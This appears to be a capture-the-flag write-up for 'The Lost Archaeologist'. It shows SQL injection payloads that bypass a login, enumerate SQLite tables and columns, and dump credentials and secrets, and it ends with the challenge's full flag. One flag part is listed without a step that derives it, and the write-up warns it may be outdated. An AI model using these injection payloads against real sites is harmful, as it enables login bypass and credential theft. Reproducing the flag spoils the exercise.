# The Lost Archaeologist 

## NOTE!
**This solution was created for an older version of the CTF and may not be entirely correct.**

## Solution
Simple `' or 1=1; --` at worker login page. This gives the first part of the flag: 
**O24{1nj3ct**

We can search thoug the military database with `a' OR true UNION SELECT 1,2,3,4; --`:

1	2	3	4
1	ramses	regular	75
2	neferu	archer	65
3	khonsu	charioteer	80
4	sebek	elite	90
5	tauret	regular	70


The database uses SQLite:
`' or 1=1 UNION SELECT 1,2,3,name FROM sqlite_master WHERE type='table';--`

# Database info
## Tables:
* ctf_schema_columns
* ctf_schema_tables
* generals
* log_entries
* pharaohs
* pharaohs_secret
* sacred_deities
* soldiers
* sqlite_sequence
* workers

## Columns
Command: `' or 1=1 UNION SELECT group_concat(name, ', '), 1,1,1 FROM pragma_table_info('ctf_schema_columns');-- `
### ctf_schema_columns
* table_name
* column_name

### ctf_schema_tables
* table_name

### generals
* id 
* username
* password
* rank

### log_entries
* id
* entry_text
* timestamp

### pharaohs
* id
* name
* access_level

### pharaohs_secret
* id
* key_name
* key_value

### sacred_deities
* id
* name
* power
* secret_code

### soldiers
* id
* name
* rank
* strength
* loyalty

### sqlite_sequence
* name
* seq

### workers
* id
* username
* password
* role

## Data
* `asdasd' UNION SELECT id, username, password, rank FROM generals;--`
* 1	general_hotep	conqueror_of_nubia	high_general
---
* `asdasd' UNION SELECT id, key_name, key_value, 1 FROM pharaohs_secret;--`
* 1	throne_access	eternal_sunrise	1
---
* `asdasd' UNION SELECT id, name, power, secret_code FROM sacred_deities;--`
* 1	amuntekh	ultimate	t3r_g0d}


# FLAG
1. **O24{1nj3ct**
2. **10n_m4s**
3. **t3r_g0d}**

Combined: **O24{1nj3ct10n_m4st3r_g0d}**
